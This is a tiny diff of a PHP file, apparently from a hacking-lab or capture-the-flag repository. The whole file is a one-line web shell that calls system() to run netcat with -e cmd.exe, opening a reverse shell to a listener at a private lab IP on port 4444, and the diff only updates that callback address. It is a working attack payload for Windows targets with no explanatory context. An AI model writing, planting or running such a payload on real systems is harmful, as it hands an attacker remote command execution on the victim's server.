@@ -1,5 +1,5 @@
 <?php
-system('nc.exe -e cmd.exe 10.10.14.5  4444')
+system('nc.exe -e cmd.exe 10.10.14.110 4444')
 ?>
 
 # for windows machines
